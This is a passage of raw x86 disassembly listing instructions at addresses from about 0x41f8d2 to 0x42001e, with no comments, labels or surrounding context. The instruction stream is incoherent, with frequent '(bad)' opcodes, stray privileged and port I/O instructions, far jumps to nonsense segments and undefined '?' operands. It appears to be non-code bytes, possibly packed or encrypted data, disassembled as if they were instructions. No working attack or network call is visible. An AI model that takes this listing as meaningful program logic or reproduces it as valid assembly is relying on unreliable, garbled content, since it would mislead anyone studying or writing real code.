  41f8d2:	push   ebx
  41f8d3:	rol    BYTE PTR [edi],0x8b
  41f8d6:	and    dl,BYTE PTR [edx+0x95799d9]
  41f8dc:	inc    ebp
  41f8dd:	int3   
  41f8de:	jnp    0x41f8b6
  41f8e0:	mov    esp,0x53db03f4
  41f8e5:	ss jmp 0x41f8cb
  41f8e8:	(bad)  
  41f8e9:	and    esi,esp
  41f8eb:	xor    eax,0x5ee75bcb
  41f8f0:	lahf   
  41f8f1:	xor    eax,0x36cd541b
  41f8f6:	repz mov ds:0x4556559a,al
  41f8fc:	mov    ebp,0x360a2a86
  41f901:	push   eax
  41f902:	or     esp,edi
  41f904:	iret   
  41f905:	jg     0x41f8c6
  41f907:	cmc    
  41f908:	dec    ebp
  41f909:	jmp    0x808aab85
  41f90e:	ret    
  41f90f:	xchg   edi,eax
  41f910:	xchg   DWORD PTR [esi+0x60bc1d75],esi
  41f916:	mov    eax,ds:0x5980496a
  41f91b:	mov    al,ds:0x50218977
  41f920:	and    DWORD PTR [eax+0x50],esp
  41f923:	in     al,dx
  41f924:	xchg   edx,eax
  41f925:	cmp    edx,DWORD PTR [edi]
  41f927:	mov    ?,WORD PTR [ebx]
  41f929:	push   edi
  41f92a:	cs inc ebp
  41f92c:	outs   dx,DWORD PTR ds:[esi]
  41f92d:	rol    DWORD PTR [edx-0x45],1
  41f930:	mov    ?,esi
  41f932:	into   
  41f933:	add    DWORD PTR [ebx],edi
  41f935:	xor    dl,BYTE PTR [ebx-0x5fc44c0b]
  41f93b:	mov    ebp,0x51bf639b
  41f940:	shr    BYTE PTR [edi],cl
  41f942:	not    dl
  41f944:	jne    0x41f9b2
  41f946:	arpl   WORD PTR [eax],dx
  41f948:	adc    al,0x8e
  41f94a:	sti    
  41f94b:	(bad)
  41f94e:	mov    dl,0x6c
  41f950:	out    0x44,eax
  41f952:	lock jmp 0xc073:0x51b719aa
  41f95a:	ret    
  41f95b:	pop    ebx
  41f95c:	fnsave [edi*2+0x6ad44c29]
  41f963:	jne    0x41f9c6
  41f965:	mul    DWORD PTR ds:0x5f87e5d0
  41f96b:	sub    BYTE PTR [ebx+ecx*4+0x0],dh
  41f96f:	sub    dl,bl
  41f971:	xor    BYTE PTR [ebp-0x16],bl
  41f974:	sbb    DWORD PTR [esi-0x69],ebx
  41f977:	gs cmp eax,0xeb2fe4a6
  41f97d:	jnp    0x41f9fa
  41f97f:	xor    eax,0x8430d018
  41f984:	hlt    
  41f985:	add    DWORD PTR [eax],0xa23fb0f0
  41f98b:	fild   DWORD PTR [ebp-0x31]
  41f98e:	idiv   BYTE PTR [esp+eiz*4]
  41f991:	push   ss
  41f992:	pop    ebp
  41f993:	mov    edx,0x499d10e1
  41f998:	jb     0x41f9e8
  41f99a:	clc    
  41f99b:	sbb    edi,ebp
  41f99d:	add    al,0x7
  41f99f:	retf   
  41f9a0:	sub    BYTE PTR [ebp+0x55],dl
  41f9a3:	shr    BYTE PTR [ebx+0x5d87d21d],cl
  41f9a9:	and    eax,0xa1cb55ea
  41f9ae:	stc    
  41f9af:	push   eax
  41f9b0:	add    BYTE PTR ds:0xa6bf9c2a,bh
  41f9b6:	and    BYTE PTR [esi],dh
  41f9b8:	mov    ah,0x50
  41f9ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9bb:	repnz in al,dx
  41f9bd:	mov    eax,ds:0xd5a7e926
  41f9c2:	pop    esi
  41f9c3:	pop    ds
  41f9c4:	lea    edi,[ecx+0x4f]
  41f9c7:	out    0x4e,eax
  41f9c9:	scas   al,BYTE PTR es:[edi]
  41f9ca:	je     0x41fa48
  41f9cc:	sbb    DWORD PTR [esi],esi
  41f9ce:	push   ebx
  41f9cf:	sbb    DWORD PTR [ebx+0x4e],0x68a7ba5e
  41f9d6:	mov    cl,0xa0
  41f9d8:	lods   eax,DWORD PTR ds:[esi]
  41f9d9:	sbb    al,0x8f
  41f9db:	pop    esp
  41f9dc:	icebp  
  41f9dd:	push   ebp
  41f9de:	add    ch,BYTE PTR [edx+esi*4-0x39]
  41f9e2:	aaa    
  41f9e3:	jg     0x41f9d0
  41f9e5:	imul   esi,eax,0xe89a618
  41f9eb:	pop    ebx
  41f9ec:	sub    al,0xd9
  41f9ee:	push   ebx
  41f9ef:	mov    eax,ds:0x27084272
  41f9f4:	cmp    eax,0x2af1932e
  41f9f9:	cmp    DWORD PTR [ecx],esi
  41f9fb:	popf   
  41f9fc:	xchg   esi,eax
  41f9fd:	imul   ecx,ecx,0xa8bb1faa
  41fa03:	(bad)  
  41fa04:	jb     0x41f9f2
  41fa06:	(bad)  
  41fa07:	jae    0x41f9d3
  41fa09:	xor    ch,BYTE PTR [esi-0x54]
  41fa0c:	cmp    BYTE PTR [eax+0x1c],ah
  41fa0f:	retf   0x92d5
  41fa12:	mov    esi,0x891c69ca
  41fa17:	(bad)  
  41fa18:	stos   DWORD PTR es:[edi],eax
  41fa19:	in     al,dx
  41fa1a:	aas    
  41fa1b:	or     DWORD PTR [ecx-0x6715502c],esi
  41fa21:	leave  
  41fa22:	add    ah,BYTE PTR [edx-0x58fc16d0]
  41fa28:	mov    ebp,0xe002d688
  41fa2d:	sbb    DWORD PTR [eax+eax*1],ebx
  41fa30:	mov    al,0x58
  41fa32:	mov    eax,0x4e3857a4
  41fa37:	fisubr DWORD PTR [ebx-0x35]
  41fa3a:	mov    eax,ds:0x3aef7c14
  41fa3f:	xlat   BYTE PTR ds:[ebx]
  41fa40:	ja     0x41fa26
  41fa42:	push   cs
  41fa43:	and    DWORD PTR [edi-0x7e74059f],esi
  41fa49:	adc    edi,0x1e
  41fa4c:	enter  0x7b9,0x5
  41fa50:	push   ebx
  41fa51:	and    BYTE PTR [edi+edx*4-0x2b],bh
  41fa55:	or     cl,al
  41fa57:	adc    eax,0x429a96cd
  41fa5c:	dec    eax
  41fa5d:	mov    BYTE PTR [edi-0x1a],0x3a
  41fa61:	cmp    ebx,ebx
  41fa63:	int3   
  41fa64:	pop    ss
  41fa65:	int3   
  41fa66:	jns    0x41fa36
  41fa68:	sar    BYTE PTR [eax],cl
  41fa6a:	mov    ebp,0x64449038
  41fa6f:	xchg   ecx,eax
  41fa70:	push   ebx
  41fa71:	lds    edx,FWORD PTR [ebx-0x9]
  41fa74:	inc    ebx
  41fa75:	dec    edx
  41fa76:	xchg   ecx,eax
  41fa77:	xchg   esi,eax
  41fa78:	inc    edi
  41fa79:	lods   eax,DWORD PTR ds:[esi]
  41fa7a:	mov    edi,0xa7e2dc42
  41fa7f:	or     DWORD PTR [edx-0x2],edx
  41fa82:	rol    DWORD PTR [esi-0x25],cl
  41fa85:	cs mov edi,0xc2695703
  41fa8b:	(bad)  
  41fa8d:	push   es
  41fa8e:	test   ebx,ecx
  41fa90:	mov    al,ds:0xf23b7c85
  41fa95:	loop   0x41fa91
  41fa97:	retf   0xbf8
  41fa9a:	mov    al,BYTE PTR [edx+0x7eaf2f95]
  41faa0:	cld    
  41faa1:	pusha  
  41faa2:	push   esi
  41faa3:	push   es
  41faa4:	outs   dx,DWORD PTR ds:[esi]
  41faa5:	xlat   BYTE PTR ds:[ebx]
  41faa6:	or     al,0x4d
  41faa8:	push   edx
  41faa9:	mov    esi,DWORD PTR [eax+0x12648523]
  41faaf:	cli    
  41fab0:	outs   dx,BYTE PTR ds:[esi]
  41fab1:	xor    al,0xd7
  41fab3:	and    ebx,DWORD PTR [esi+0x22decc42]
  41fab9:	xor    ecx,DWORD PTR [ebp-0x7d4bd5cf]
  41fabf:	jecxz  0x41fadc
  41fac1:	int    0xd8
  41fac3:	jmp    0x41fa87
  41fac5:	push   0x15
  41fac7:	xchg   DWORD PTR [ebx],eax
  41fac9:	xchg   esp,eax
  41faca:	push   edx
  41facb:	scas   al,BYTE PTR es:[edi]
  41facc:	cmp    esi,DWORD PTR [eax-0x57d0e7c6]
  41fad2:	xchg   edx,eax
  41fad3:	push   0xc8b6b7f9
  41fad8:	ins    BYTE PTR es:[edi],dx
  41fad9:	mov    cl,0xc9
  41fadb:	retf   0xfaa5
  41fade:	test   eax,0xe7e7a7d
  41fae3:	push   ebx
  41fae4:	adc    ah,dh
  41fae6:	and    BYTE PTR [edi-0x21],ch
  41fae9:	push   ecx
  41faea:	test   esi,0x3b1d4d2f
  41faf0:	int    0xef
  41faf2:	in     eax,dx
  41faf3:	gs fs xchg ebx,eax
  41faf6:	pop    edx
  41faf7:	test   al,0xfe
  41faf9:	jbe    0x41fac3
  41fafb:	inc    edi
  41fafc:	adc    edx,edx
  41fafe:	add    DWORD PTR [ecx-0x26cb3c33],0xaacbe4c0
  41fb08:	jno    0x41fb4e
  41fb0a:	in     eax,dx
  41fb0b:	arpl   ax,dx
  41fb0d:	xchg   DWORD PTR [edx-0x6c6ea9ad],ebx
  41fb13:	mov    dl,0x65
  41fb15:	enter  0x2349,0x9f
  41fb19:	test   DWORD PTR [eax+0x5046d586],eax
  41fb1f:	std    
  41fb20:	or     ah,BYTE PTR [esi+0x28]
  41fb23:	xchg   esp,eax
  41fb24:	fidivr DWORD PTR [ebp+0x7d]
  41fb27:	dec    ecx
  41fb28:	push   0xffffffa8
  41fb2a:	mov    esi,0xd78e7ba9
  41fb2f:	sbb    DWORD PTR [ecx],eax
  41fb31:	push   ss
  41fb32:	jecxz  0x41faff
  41fb34:	cmp    BYTE PTR [ecx+0x45c0abb8],dl
  41fb3a:	or     edi,ebp
  41fb3c:	xor    al,0x42
  41fb3e:	pop    ecx
  41fb3f:	fidiv  DWORD PTR [edx]
  41fb41:	pop    ebp
  41fb42:	mov    esi,0xc2560343
  41fb47:	inc    ebx
  41fb48:	das    
  41fb49:	loopne 0x41faec
  41fb4b:	xchg   ebp,eax
  41fb4c:	sbb    eax,0xe16f8978
  41fb51:	inc    edi
  41fb52:	inc    ebx
  41fb53:	icebp  
  41fb54:	fxsave [esp+ebp*2]
  41fb58:	fiadd  DWORD PTR [ebx]
  41fb5a:	(bad)  
  41fb5b:	or     BYTE PTR ds:0xab626fd2,cl
  41fb61:	push   cs
  41fb62:	adc    eax,0xd864c743
  41fb67:	dec    esp
  41fb68:	mov    ds:0x8f2f2342,eax
  41fb6d:	sbb    DWORD PTR [ebx+0x455ade6e],esp
  41fb73:	mov    ecx,0xf504c0c4
  41fb78:	xor    DWORD PTR [ebp-0x2d],ebp
  41fb7b:	outs   dx,DWORD PTR ds:[esi]
  41fb7c:	lods   eax,DWORD PTR ds:[esi]
  41fb7d:	pop    es
  41fb7e:	retf   
  41fb7f:	adc    DWORD PTR [ecx],edi
  41fb81:	inc    edi
  41fb82:	pop    bx
  41fb84:	sub    DWORD PTR [edx-0x78b57d3],ecx
  41fb8a:	mov    esp,0x78c38b7f
  41fb8f:	mov    al,0x45
  41fb91:	xchg   ebp,eax
  41fb92:	stos   BYTE PTR es:[edi],al
  41fb93:	loop   0x41fbc6
  41fb95:	xor    esi,eax
  41fb97:	int3   
  41fb98:	mov    ah,0x70
  41fb9a:	scas   al,BYTE PTR es:[edi]
  41fb9b:	das    
  41fb9c:	mov    ecx,0x4a6c78ec
  41fba1:	aas    
  41fba2:	daa    
  41fba3:	cmp    al,0xd0
  41fba5:	push   es
  41fba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba7:	clc    
  41fba8:	push   ebp
  41fba9:	ins    DWORD PTR es:[edi],dx
  41fbaa:	into   
  41fbab:	xlat   BYTE PTR ds:[ebx]
  41fbac:	pusha  
  41fbad:	test   ah,al
  41fbaf:	scas   al,BYTE PTR es:[edi]
  41fbb0:	push   eax
  41fbb1:	mov    ebx,0xc9ecd2c4
  41fbb6:	mov    al,ds:0x73c499d9
  41fbbb:	add    al,cl
  41fbbd:	ins    DWORD PTR es:[edi],dx
  41fbbe:	and    BYTE PTR [edi+0x36],cl
  41fbc1:	int    0x10
  41fbc3:	ficom  WORD PTR [edi-0x4b]
  41fbc6:	add    al,0x78
  41fbc8:	fistp  WORD PTR [ebx+edi*1-0xb3033e3]
  41fbcf:	mov    al,0xdc
  41fbd1:	xchg   ebx,eax
  41fbd2:	push   ebx
  41fbd3:	ror    DWORD PTR [ecx+0x5],0x7b
  41fbd7:	lds    ebp,FWORD PTR [eax]
  41fbd9:	dec    eax
  41fbda:	push   esp
  41fbdb:	or     al,0x8f
  41fbdd:	and    al,0x38
  41fbdf:	aam    0x23
  41fbe1:	popa   
  41fbe2:	adc    DWORD PTR [edi],ebx
  41fbe4:	pop    ss
  41fbe5:	pop    ecx
  41fbe6:	scas   al,BYTE PTR es:[edi]
  41fbe7:	bnd call 0x6ec654ba
  41fbed:	dec    eax
  41fbee:	xor    dl,BYTE PTR [edx-0xf]
  41fbf1:	xchg   esp,eax
  41fbf2:	dec    eax
  41fbf3:	icebp  
  41fbf4:	daa    
  41fbf5:	lods   eax,DWORD PTR ds:[esi]
  41fbf6:	(bad)
  41fbf9:	cdq    
  41fbfa:	adc    DWORD PTR [ecx],ebx
  41fbfc:	cmp    eax,0x1ce400d5
  41fc01:	stos   BYTE PTR es:[edi],al
  41fc02:	xchg   esi,eax
  41fc03:	arpl   si,si
  41fc05:	pop    ebx
  41fc06:	pusha  
  41fc07:	cmp    al,0x24
  41fc09:	les    edi,FWORD PTR [eax-0x6f1270df]
  41fc0f:	pushf  
  41fc10:	imul   edi,DWORD PTR [edx+0x351980a0],0xffffffa3
  41fc17:	xor    al,0xe9
  41fc19:	cmc    
  41fc1a:	push   ecx
  41fc1b:	(bad)  
  41fc1c:	call   0xe39e:0xa4942162
  41fc23:	loop   0x41fba5
  41fc25:	push   edx
  41fc26:	mov    edi,DWORD PTR [ecx]
  41fc28:	lods   al,BYTE PTR ds:[esi]
  41fc29:	push   0xffffff95
  41fc2b:	pop    es
  41fc2c:	mov    dl,0xc
  41fc2e:	popa   
  41fc2f:	es jnp 0x41fbce
  41fc32:	fld    QWORD PTR [edi+eax*2]
  41fc35:	mov    esi,edi
  41fc37:	dec    edx
  41fc38:	adc    BYTE PTR [esi+0x55d2bd3c],dh
  41fc3e:	push   eax
  41fc3f:	mov    ds:0x8853f84e,eax
  41fc44:	inc    ecx
  41fc45:	mov    bh,0x47
  41fc47:	mov    ?,WORD PTR ss:[eax+0x4af6aec6]
  41fc4e:	and    al,0xc
  41fc50:	xor    eax,0xdfe64f3e
  41fc55:	popf   
  41fc56:	mov    ebx,0xf9639ae7
  41fc5b:	in     eax,0x91
  41fc5d:	outs   dx,BYTE PTR ds:[esi]
  41fc5e:	xchg   edi,eax
  41fc5f:	sbb    bh,BYTE PTR [ebx-0x77]
  41fc62:	mov    al,ds:0xbe45991e
  41fc67:	or     DWORD PTR cs:[eax],ebp
  41fc6a:	push   es
  41fc6b:	test   eax,0xc5a3f60
  41fc70:	mov    ds:0x9d74f7a7,eax
  41fc75:	(bad)  [esi+ecx*2-0x2a]
  41fc79:	(bad)  
  41fc7a:	mov    al,0xca
  41fc7c:	sbb    ah,BYTE PTR [ecx]
  41fc7e:	data16 int 0x78
  41fc81:	push   0xa02d1b3d
  41fc86:	sbb    dl,cl
  41fc88:	add    eax,0xabd39f7e
  41fc8d:	lds    esp,FWORD PTR [edi+0x68]
  41fc90:	div    BYTE PTR [edi]
  41fc92:	pop    ebx
  41fc93:	neg    ecx
  41fc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc96:	sti    
  41fc97:	inc    edx
  41fc98:	and    DWORD PTR [eax+0xe],edx
  41fc9b:	pop    ebx
  41fc9c:	add    ebp,ebp
  41fc9e:	xchg   edx,eax
  41fc9f:	xor    eax,0xb23fdd10
  41fca4:	scas   al,BYTE PTR es:[edi]
  41fca5:	sbb    DWORD PTR ds:0x352bfce1,ebp
  41fcab:	mov    ch,0x33
  41fcad:	jb     0x41fd2e
  41fcaf:	inc    edx
  41fcb0:	popfw  
  41fcb2:	test   BYTE PTR [edx-0x71],ah
  41fcb5:	mov    ecx,0x9d0c86aa
  41fcba:	jnp    0x41fd17
  41fcbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcbd:	(bad)  
  41fcbe:	jbe    0x41fcb6
  41fcc0:	test   al,0x11
  41fcc2:	sbb    esi,eax
  41fcc4:	dec    ecx
  41fcc5:	ss loope 0x41fca2
  41fcc8:	mov    dl,0x54
  41fcca:	or     eax,0xdb713a71
  41fccf:	sti    
  41fcd0:	mov    ds:0x3aae53d4,al
  41fcd5:	ret    
  41fcd6:	adc    al,0x15
  41fcd8:	aaa    
  41fcd9:	dec    ecx
  41fcda:	lea    ebp,[edi+0x4c18efc6]
  41fce0:	mov    cl,0xdb
  41fce2:	ffree  st(6)
  41fce4:	imul   esp,DWORD PTR [eax-0x5a712e48],0xffffffd2
  41fceb:	in     eax,0x5e
  41fced:	cmp    BYTE PTR [esp+edx*8-0x4e462e0d],bl
  41fcf4:	repnz int 0x94
  41fcf7:	pop    edi
  41fcf8:	addr16 dec edx
  41fcfa:	push   0xffffff84
  41fcfc:	dec    edx
  41fcfd:	and    bl,dl
  41fcff:	or     DWORD PTR [ebp+0x7f42475c],0xaa005f56
  41fd09:	inc    edx
  41fd0a:	sub    BYTE PTR [edi+0x32],bl
  41fd0d:	jb     0x41fd02
  41fd0f:	sar    bh,cl
  41fd11:	dec    edi
  41fd12:	and    al,0xb2
  41fd14:	adc    al,0x7b
  41fd16:	inc    edi
  41fd17:	pusha  
  41fd18:	inc    esi
  41fd19:	mov    ds:0x98c49a7e,eax
  41fd1e:	jge    0x41fd45
  41fd20:	iret   
  41fd21:	test   edx,ebx
  41fd23:	mov    al,0x5a
  41fd25:	shl    BYTE PTR [esi+edx*1],0x4b
  41fd29:	jo     0x41fd6b
  41fd2b:	jbe    0x41fd31
  41fd2d:	pop    ebp
  41fd2e:	adc    DWORD PTR [ebp-0x3d],esp
  41fd31:	sub    esi,esp
  41fd33:	and    DWORD PTR [ecx+0x332eb20b],eax
  41fd39:	fcomip st,st(5)
  41fd3b:	stos   DWORD PTR es:[edi],eax
  41fd3c:	mov    eax,0x9ca944c2
  41fd41:	mov    ds:0x95c801e7,al
  41fd46:	pushf  
  41fd47:	push   0xffffffed
  41fd49:	(bad)  
  41fd4a:	aad    0x27
  41fd4c:	adc    eax,0xc4e5143f
  41fd51:	rol    ebx,1
  41fd53:	mov    al,0xa5
  41fd55:	jne    0x41fd77
  41fd57:	in     al,dx
  41fd58:	cmp    BYTE PTR [eax-0x72],ch
  41fd5b:	sbb    BYTE PTR [edi+0x2e],cl
  41fd5e:	add    eax,0x9b6b08c7
  41fd63:	out    dx,eax
  41fd64:	pop    DWORD PTR [esi+0x72]
  41fd67:	and    DWORD PTR [edx],0x739929a2
  41fd6d:	or     BYTE PTR [ecx],cl
  41fd6f:	jmp    0x41fd90
  41fd71:	stc    
  41fd72:	std    
  41fd73:	jl     0x41fd53
  41fd75:	sub    BYTE PTR ds:0x3e94e16f,dl
  41fd7b:	xchg   ebx,eax
  41fd7c:	scas   eax,DWORD PTR es:[edi]
  41fd7d:	mov    edx,0x692ad2cd
  41fd82:	cwde   
  41fd83:	jge    0x41fd5d
  41fd85:	mov    edi,0xfbfde8d5
  41fd8a:	adc    ebx,edx
  41fd8c:	push   ss
  41fd8d:	cmp    cl,BYTE PTR [ecx+0x508bba3a]
  41fd93:	cmp    al,0x7d
  41fd95:	mov    dl,0xda
  41fd97:	cwde   
  41fd98:	shl    bh,1
  41fd9a:	jg     0x41fda8
  41fd9c:	stc    
  41fd9d:	mov    bl,0xab
  41fd9f:	out    0x6e,eax
  41fda1:	or     al,BYTE PTR [ebx]
  41fda3:	call   0x3f50396a
  41fda8:	push   ebx
  41fda9:	mov    edx,0x2afe497d
  41fdae:	push   ds
  41fdaf:	xor    esi,DWORD PTR ds:0xf7999b5a
  41fdb5:	mov    ah,0xfb
  41fdb7:	mov    cs,WORD PTR [ebx-0xaa5ee0a]
  41fdbd:	sub    al,0x42
  41fdbf:	icebp  
  41fdc0:	out    0x17,al
  41fdc2:	stos   DWORD PTR es:[edi],eax
  41fdc3:	lock mov ah,0x55
  41fdc6:	xor    dl,BYTE PTR [esi+0x1ec02c37]
  41fdcc:	xchg   esp,eax
  41fdcd:	mov    dh,0x31
  41fdcf:	fs mov eax,esp
  41fdd2:	push   es
  41fdd3:	lock xchg esp,eax
  41fdd5:	aam    0x14
  41fdd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdd8:	fistp  DWORD PTR [eax-0x27d61b04]
  41fdde:	mov    dl,0x8f
  41fde0:	(bad)  
  41fde1:	sub    eax,0x1e86ae68
  41fde6:	or     al,0xab
  41fde8:	pop    ss
  41fde9:	popf   
  41fdea:	mov    edi,0x14659403
  41fdef:	in     eax,dx
  41fdf0:	mov    esp,0x90f57afb
  41fdf5:	adc    al,0x32
  41fdf7:	and    BYTE PTR [edi+esi*4-0x67],ah
  41fdfb:	cwde   
  41fdfc:	out    dx,eax
  41fdfd:	retf   0x71f0
  41fe00:	pop    ecx
  41fe01:	scas   al,BYTE PTR es:[edi]
  41fe02:	mov    dh,0x8c
  41fe04:	mov    bl,0x2d
  41fe06:	call   DWORD PTR [ecx+0x744b0420]
  41fe0c:	clc    
  41fe0d:	loopne 0x41fe7c
  41fe0f:	cmp    eax,0x1618608f
  41fe14:	outs   dx,BYTE PTR ds:[esi]
  41fe15:	adc    esi,0x34
  41fe18:	xor    eax,0xc7d2086a
  41fe1d:	push   eax
  41fe1e:	ins    DWORD PTR es:[edi],dx
  41fe1f:	mov    ah,0x5b
  41fe21:	mov    edi,0x2811fc8e
  41fe26:	ret    0xa025
  41fe29:	sbb    dl,al
  41fe2b:	mov    fs,esi
  41fe2d:	ja     0x41fe59
  41fe2f:	xchg   ebp,eax
  41fe30:	es push 0xffffffcd
  41fe33:	push   esp
  41fe34:	in     eax,dx
  41fe35:	pop    esi
  41fe36:	mov    DWORD PTR [edx+0x40],esi
  41fe39:	xchg   edi,eax
  41fe3a:	jb     0x41fe50
  41fe3c:	adc    bh,cl
  41fe3e:	popf   
  41fe3f:	cmp    eax,0x3407f063
  41fe44:	test   eax,0x98c5ac07
  41fe49:	sub    ebp,DWORD PTR [edi-0x36]
  41fe4c:	sbb    BYTE PTR [ecx],dl
  41fe4e:	cmp    ah,BYTE PTR [esi-0x642d01e4]
  41fe54:	sub    dh,BYTE PTR [edi+edx*8-0x50]
  41fe58:	in     eax,0x96
  41fe5a:	mov    BYTE PTR [edx-0x50364fbb],al
  41fe60:	dec    ecx
  41fe61:	jle    0x41fea0
  41fe63:	jbe    0x41fe25
  41fe65:	into   
  41fe66:	mov    ch,bl
  41fe68:	pop    esp
  41fe69:	shl    BYTE PTR [edx],1
  41fe6b:	mov    al,ds:0x320d0550
  41fe70:	ins    BYTE PTR es:[edi],dx
  41fe71:	popf   
  41fe72:	xor    cl,0x7c
  41fe75:	fnstcw WORD PTR [edi+0x76]
  41fe78:	out    0x79,eax
  41fe7a:	imul   ecx,DWORD PTR [esi-0x7b094681],0x36
  41fe81:	rcr    DWORD PTR [ecx-0x53d8797a],0xde
  41fe88:	sbb    BYTE PTR [eax],dh
  41fe8a:	int3   
  41fe8b:	sar    DWORD PTR [ecx+0x58],cl
  41fe8e:	mov    ebx,DWORD PTR [bx+si]
  41fe91:	out    dx,eax
  41fe92:	shl    BYTE PTR [ecx+0x26],cl
  41fe95:	xchg   esp,eax
  41fe96:	cmc    
  41fe97:	sbb    dh,BYTE PTR cs:[edx]
  41fe9a:	call   eax
  41fe9c:	sub    dh,BYTE PTR [ebx-0x153d856b]
  41fea2:	sbb    bh,ch
  41fea4:	inc    ebx
  41fea5:	leave  
  41fea6:	jo     0x41feaf
  41fea8:	in     eax,dx
  41fea9:	neg    DWORD PTR [ebp+0x4586cd4f]
  41feaf:	xor    BYTE PTR [ebp-0x5d],al
  41feb2:	mov    al,0x36
  41feb4:	gs jge 0x41feb8
  41feb7:	mov    BYTE PTR [eax+eax*4-0x35ba76c8],dl
  41febe:	cld    
  41febf:	(bad)  
  41fec0:	ins    BYTE PTR es:[edi],dx
  41fec1:	outs   dx,DWORD PTR ds:[esi]
  41fec2:	xchg   ecx,eax
  41fec3:	sub    DWORD PTR [esi],ebp
  41fec5:	pop    esi
  41fec6:	jg     0x41fe82
  41fec8:	pop    ebp
  41fec9:	arpl   dx,dx
  41fecb:	test   al,0x8
  41fecd:	or     DWORD PTR [eax],0x872f4ebb
  41fed3:	test   eax,0x6371e94b
  41fed8:	jmp    0x860f:0xdc72d75d
  41fedf:	dec    edx
  41fee0:	sbb    al,BYTE PTR [ebx]
  41fee2:	and    edi,esi
  41fee4:	hlt    
  41fee5:	ins    BYTE PTR es:[edi],dx
  41fee6:	jp     0x41fee3
  41fee8:	mov    dh,0xb7
  41feea:	pop    es
  41feeb:	dec    esi
  41feec:	inc    ecx
  41feed:	pop    esp
  41feee:	push   ebx
  41feef:	ret    
  41fef0:	xor    eax,0x86d417a4
  41fef5:	jg     0x41ff4f
  41fef7:	pop    ebp
  41fef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef9:	sub    eax,0x628471c4
  41fefe:	loop   0x41ff0d
  41ff00:	jecxz  0x41ff53
  41ff02:	pop    ebx
  41ff03:	add    cl,ah
  41ff05:	test   bh,0xff
  41ff08:	xlat   BYTE PTR ds:[ebx]
  41ff09:	cmc    
  41ff0a:	ffreep st(0)
  41ff0c:	mov    eax,0x2bc252d8
  41ff11:	mov    WORD PTR [eax-0x76],gs
  41ff14:	cmovne esi,DWORD PTR [edx+0x4ca1e851]
  41ff1b:	jp     0x41ff76
  41ff1d:	pop    eax
  41ff1e:	call   0x6b410bad
  41ff23:	je     0x41fee2
  41ff25:	dec    esp
  41ff26:	gs fdivp st(6),st
  41ff2a:	fmul   DWORD PTR [edi*2-0x5467e49f]
  41ff31:	push   ds
  41ff32:	dec    ecx
  41ff33:	mov    ds:0xf2046c67,eax
  41ff38:	push   esp
  41ff39:	test   BYTE PTR [edx+0x4db82134],ah
  41ff3f:	call   0xd67ea9a0
  41ff44:	fcmovbe st,st(7)
  41ff46:	inc    ecx
  41ff47:	push   ebx
  41ff48:	pop    edx
  41ff49:	stos   DWORD PTR es:[edi],eax
  41ff4a:	sub    ah,BYTE PTR [ebx+edx*2-0xe]
  41ff4e:	pop    eax
  41ff4f:	add    al,0x5e
  41ff51:	xlat   BYTE PTR ds:[ebx]
  41ff52:	sub    al,0x5a
  41ff54:	mov    ah,0x2d
  41ff56:	pop    edx
  41ff57:	dec    eax
  41ff58:	fs fcmovnb st,st(7)
  41ff5b:	cmp    bl,0x93
  41ff5e:	mov    eax,ds:0xb48d3424
  41ff63:	and    DWORD PTR [eax],ebp
  41ff65:	push   esp
  41ff66:	fsqrt  
  41ff68:	std    
  41ff69:	pop    ss
  41ff6a:	push   ecx
  41ff6b:	pop    esi
  41ff6c:	(bad)  
  41ff6d:	hlt    
  41ff6e:	clc    
  41ff6f:	mov    dl,0x6f
  41ff71:	pop    ds
  41ff72:	push   edi
  41ff73:	dec    edi
  41ff74:	adc    eax,DWORD PTR [ebx+0x5c]
  41ff77:	outs   dx,DWORD PTR ds:[esi]
  41ff78:	mov    DWORD PTR [eax],esp
  41ff7a:	xor    ecx,DWORD PTR [esi+edx*8-0x2c]
  41ff7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff7f:	inc    eax
  41ff80:	test   eax,0xe9000027
  41ff85:	pop    edi
  41ff86:	mov    esp,0x69904f0c
  41ff8b:	jp     0x41ffb7
  41ff8d:	mov    edi,0xd26de6b3
  41ff92:	xor    BYTE PTR [edx-0x42],bl
  41ff95:	(bad)  
  41ff96:	(bad)  
  41ff97:	mov    BYTE PTR [ebp+0x4f],al
  41ff9a:	enter  0x2f88,0x7a
  41ff9e:	fld    QWORD PTR [edx]
  41ffa0:	pop    eax
  41ffa1:	popf   
  41ffa2:	add    ebx,DWORD PTR [edi+0x68]
  41ffa5:	jge    0x42000d
  41ffa7:	les    ecx,FWORD PTR [esi]
  41ffa9:	and    cl,BYTE PTR [eax]
  41ffab:	test   eax,0x6f50cb2
  41ffb0:	mov    al,0xe4
  41ffb2:	jle    0x41ffd5
  41ffb4:	gs pop esp
  41ffb6:	jmp    0xbde36cb5
  41ffbb:	cs fs inc ebx
  41ffbe:	cmp    cl,BYTE PTR [eax+0x139abcf5]
  41ffc4:	cs cli 
  41ffc6:	aad    0xd9
  41ffc8:	inc    esi
  41ffc9:	popf   
  41ffca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffcb:	test   DWORD PTR [ecx],ecx
  41ffcd:	dec    esp
  41ffce:	enter  0xb46c,0xd9
  41ffd2:	mov    ebp,esp
  41ffd4:	xchg   ecx,eax
  41ffd5:	lods   al,BYTE PTR ds:[esi]
  41ffd6:	jne    0x420052
  41ffd8:	dec    ecx
  41ffd9:	fmul   st(1),st
  41ffdb:	jmp    0xfb56:0xcf20fdf4
  41ffe2:	sub    DWORD PTR [edx],esp
  41ffe4:	xor    eax,0xb0f1265c
  41ffe9:	jmp    DWORD PTR [esi]
  41ffeb:	xor    BYTE PTR [edx+0x3b],ch
  41ffee:	fsub   DWORD PTR [edx+0x7]
  41fff1:	xor    eax,0x34bafcb
  41fff7:	jb     0x420067
  41fff9:	retf   
  41fffa:	mov    esp,0x5461f34d
  41ffff:	jne    0x41ff96
  420001:	cmp    DWORD PTR [edx],0x3f325b13
  420007:	leave  
  420008:	loope  0x42003b
  42000a:	jge    0x420028
  42000c:	and    DWORD PTR [edx+0x305ca3cc],ecx
  420012:	(bad)  
  420014:	push   ebp
  420015:	retf   
  420016:	jmp    0x420093
  420018:	mov    esi,gs
  42001a:	arpl   WORD PTR es:[ecx-0x52],di
  42001e:	mov    dh,ah
